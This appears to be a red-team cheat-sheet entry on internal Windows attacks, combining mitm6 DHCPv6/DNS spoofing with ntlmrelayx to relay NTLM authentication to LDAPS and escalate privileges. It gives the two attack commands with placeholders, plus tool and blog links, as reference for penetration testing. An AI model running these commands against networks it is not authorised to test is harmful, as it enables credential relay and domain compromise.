# REDTEAM
## INTERNAL WINDOWS
### --> MITM ATTACKS
#### 1. *Mitm6 + NTLM RELAY*
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**Description:** The attack enables to forge fake DNS Server, by replaying to DHCPv6 requests in internal network. The tool can be combined with ntlmrelay to further escalate privileges.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br/><br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**Repositry:** https://github.com/fox-it/mitm6<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</br>

Description | Commands
------------ | -------------
*First set up ntlmrelay* | `ntlmrelayx.py -6 -t ldaps://10.0.10.26 -wh <DOMAIN> -l loot`
*Start mitm6 on the same network that hosts in* | `mitm6.py -d <DOMAIN>`
</br>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**Blogs:**</br>

* https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/
* https://medium.com/@browninfosecguy/ipv6-exploitation-in-ad-environment-b22a7c3ec8af
